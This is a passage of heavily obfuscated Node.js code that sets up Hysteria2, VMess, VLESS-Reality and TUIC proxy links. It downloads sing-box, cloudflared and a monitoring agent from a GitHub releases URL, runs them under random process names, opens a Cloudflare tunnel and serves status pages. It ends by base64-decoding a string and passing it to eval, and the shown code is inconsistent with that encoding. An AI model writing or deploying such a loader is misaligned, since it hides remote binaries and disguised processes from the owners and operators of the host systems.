_0x2bf1f3=[];if(CONFIG['HY2_PORT']){_0x2bf1f3[_0x4340('0x63')]({'protocol':_0x4340('0x13'),'url':'hysteria2://'+CONFIG['HY2_PASSWORD']+'@'+_0x3912f2+':'+CONFIG['HY2_PORT']+_0x4340('0x5b')+CONFIG['HY2_SNI']+_0x4340('0x40')});}if(CONFIG[_0x4340('0x5c')]){const _0x4b2361={'v':'2','ps':_0x4340('0x6d'),'add':CONFIG[_0x4340('0x61')],'port':'443','id':CONFIG[_0x4340('0x1')],'aid':'0','scy':_0x4340('0x36'),'net':'ws','type':_0x4340('0x4'),'host':CONFIG['C_D'],'path':CONFIG['VMESS_PATH'],'tls':'tls','sni':CONFIG[_0x4340('0x86')],'alpn':'','fp':_0x4340('0x4e')};_0x2bf1f3['push']({'protocol':'VMess','url':'vmess://'+Buffer['from'](JSON[_0x4340('0x71')](_0x4b2361))[_0x4340('0x73')]('base64')});}if(CONFIG[_0x4340('0x3')]){_0x2bf1f3[_0x4340('0x63')]({'protocol':_0x4340('0x5a'),'url':_0x4340('0x49')+CONFIG['VMESS_UUID']+'@'+_0x3912f2+':'+CONFIG[_0x4340('0x3')]+'?encryption=none&flow=xtls-rprx-vision&security=reality&sni='+CONFIG['REALITY_SNI']+'&fp=chrome&pbk='+CONFIG[_0x4340('0x4b')]+'&sid='+CONFIG['REALITY_SHORT_ID']+_0x4340('0x42')});}if(CONFIG[_0x4340('0x6')]){_0x2bf1f3['push']({'protocol':'TUIC','url':'tuic://'+CONFIG[_0x4340('0x6a')]+':'+CONFIG[_0x4340('0x9')]+'@'+_0x3912f2+':'+CONFIG['TUIC_PORT']+_0x4340('0x3f')});}return _0x2bf1f3;}function cleanup(){processes[_0x4340('0x6b')](_0x3ee920=>{try{_0x3ee920['kill']();}catch(_0x1e99b2){}});process['exit'](0x0);}async function startService(_0x51b370,_0x224ec6,_0x1e4bb3,_0x5a882f={}){try{const _0x156d8b=spawn(_0x51b370,_0x224ec6,{'stdio':['ignore',_0x4340('0x10'),'pipe'],..._0x5a882f});if(_0x5a882f[_0x4340('0x84')]){const _0x3c54cb=fs['createWriteStream'](_0x5a882f['logFile']);_0x156d8b['stdout']['pipe'](_0x3c54cb);_0x156d8b[_0x4340('0x80')][_0x4340('0x10')](_0x3c54cb);}serviceStatus[_0x1e4bb3[_0x4340('0x1f')]()]=_0x4340('0x31');_0x156d8b['on']('spawn',()=>{serviceStatus[_0x1e4bb3[_0x4340('0x1f')]()]='running';});_0x156d8b['on'](_0x4340('0x32'),()=>{serviceStatus[_0x1e4bb3['toLowerCase']()]=_0x4340('0x32');});_0x156d8b['on'](_0x4340('0x44'),()=>{serviceStatus[_0x1e4bb3['toLowerCase']()]=_0x4340('0x56');});return new Promise(_0x1801ca=>{const _0x21d6a9=()=>{if(_0x156d8b[_0x4340('0x78')]){serviceStatus[_0x1e4bb3['toLowerCase']()]=_0x4340('0x56');_0x1801ca(null);}else{processes[_0x4340('0x63')](_0x156d8b);_0x1801ca(_0x156d8b);}};setTimeout(_0x21d6a9,0x7d0);});}catch(_0x3ad779){serviceStatus[_0x1e4bb3[_0x4340('0x1f')]()]=_0x4340('0x32');return null;}}const app=express();app[_0x4340('0x70')]('/',(_0x20fa04,_0x103a68)=>{_0x103a68['writeHead'](0xc8,{'Content-Type':'text/html'});_0x103a68['end'](HTML_TEMPLATES['home']);});app['get']('/status',async(_0x153954,_0x26bc50)=>{const _0x55a1a2=await getServerIP();const _0x246d55=generateLinks(_0x55a1a2);_0x26bc50['writeHead'](0xc8,{'Content-Type':'text/html'});_0x26bc50['end'](HTML_TEMPLATES['status'](_0x55a1a2,_0x246d55));});app[_0x4340('0x70')]('/x',async(_0x485ae1,_0x46d7f7)=>{const _0x59cdef=await getServerIP();const _0x321c29=generateLinks(_0x59cdef);_0x46d7f7['writeHead'](0xc8,{'Content-Type':_0x4340('0x23')});_0x46d7f7['end'](HTML_TEMPLATES['status'](_0x59cdef,_0x321c29));});app['get'](_0x4340('0x43'),(_0xf77457,_0x3806f4)=>{_0x3806f4[_0x4340('0x6c')](0xc8,{'Content-Type':'application/json'});_0x3806f4['end'](JSON[_0x4340('0x71')]({'status':'ok','uptime':process['uptime']()}));});const server=http[_0x4340('0x25')](app);server['on'](_0x4340('0x81'),createProxyMiddleware({'target':'ws://localhost:'+CONFIG[_0x4340('0x5c')],'changeOrigin':!![],'ws':!![],'logLevel':_0x4340('0x2b')}));async function main(){server['listen'](CONFIG['PORT'],()=>{serviceStatus[_0x4340('0x59')]=_0x4340('0x31');});try{const _0x3033ba=detectArch();const _0x51f455=_0x3033ba==='arm64';const _0x4a6115=getRandomProcessName();const _0x53cca2=getRandomProcessName();const _0x29a1f8=getRandomProcessName();const _0x155122=path['join'](WORK_DIR,_0x4a6115);const _0x4dc1a0=path['join'](WORK_DIR,_0x53cca2);const _0x231df7=path['join'](WORK_DIR,_0x29a1f8);const _0x30ffb0={'singbox':_0x51f455?'https://github.com/seav1/dl/releases/download/files/sb-arm':'https://github.com/seav1/dl/releases/download/files/sb','cloudflared':_0x51f455?_0x4340('0x0'):'https://github.com/seav1/dl/releases/download/files/cf','komari':_0x51f455?_0x4340('0x4a'):_0x4340('0x26')};await Promise[_0x4340('0x76')]([downloadBinary(_0x30ffb0['singbox'],_0x155122),downloadBinary(_0x30ffb0['cloudflared'],_0x4dc1a0),downloadBinary(_0x30ffb0['komari'],_0x231df7)]);[_0x155122,_0x4dc1a0,_0x231df7][_0x4340('0x6b')](_0x3cebbc=>{if(!fs['existsSync'](_0x3cebbc))throw new Error('文件未找到:\x20'+_0x3cebbc);});const _0x389db3=await getServerIP();if(CONFIG['HY2_PORT']||CONFIG[_0x4340('0x5c')]||CONFIG['REALITY_PORT']||CONFIG['TUIC_PORT']){await generateRealityKeys(_0x155122);const _0x3e0c1b=await generateSingBoxConfig();try{await new Promise((_0x39898d,_0x1f4599)=>{exec('\x22'+_0x155122+_0x4340('0xb')+_0x3e0c1b+'\x22',_0x3cab63=>{if(_0x3cab63){_0x1f4599(_0x3cab63);}else{_0x39898d();}});});await startService(_0x155122,['run','-c',_0x3e0c1b],'singbox');}catch(_0x1fc0ad){serviceStatus[_0x4340('0x55')]=_0x4340('0x32');}}if(CONFIG[_0x4340('0x82')]){try{const _0x13916b=['tunnel','--edge-ip-version','auto','--protocol',_0x4340('0x38'),'--no-autoupdate','run',_0x4340('0x89'),CONFIG['C_T'],_0x4340('0x64'),_0x4340('0x4f')+CONFIG['PORT']];await startService(_0x4dc1a0,_0x13916b,_0x4340('0x58'));}catch(_0x32ee8e){serviceStatus[_0x4340('0x58')]='error';}}else if(CONFIG['VMESS_PORT']){const _0x3c3d5a=await startTempTunnel(_0x4dc1a0,CONFIG['PORT']);if(!_0x3c3d5a){serviceStatus['cloudflared']='error';}}if(CONFIG['K_S']&&CONFIG[_0x4340('0x8')]){const _0x5e70d8=['-e',''+CONFIG['K_S'],'-t',''+CONFIG['K_K']];try{await startService(_0x231df7,_0x5e70d8,_0x4340('0x47'),{'logFile':path['join'](WORK_DIR,'komari.log')});}catch(_0x435b7c){serviceStatus['komari']='error';}}setInterval(()=>{processes['forEach'](_0x5ac474=>{if(_0x5ac474[_0x4340('0x78')]){const _0x4ca1fe=Object[_0x4340('0x11')](serviceStatus)[_0x4340('0x19')](_0x42d435=>serviceStatus[_0x42d435]===_0x4340('0x31')&&!processes[_0x4340('0x5d')](_0x2e2dc9=>_0x2e2dc9!==_0x5ac474&&!_0x2e2dc9['killed']));if(_0x4ca1fe){serviceStatus[_0x4ca1fe]=_0x4340('0x56');}}});if(processes['length']>0x0&&processes['every'](_0xaf47b3=>_0xaf47b3[_0x4340('0x78')])){cleanup();}},0x2710);process['on']('SIGINT',cleanup);process['on'](_0x4340('0xd'),cleanup);}catch(_0x347b30){process[_0x4340('0x44')](0x1);}}main()[_0x4340('0x88')](()=>process[_0x4340('0x44')](0x1));';
const code = Buffer.from(b, 'base64').toString();
eval(code);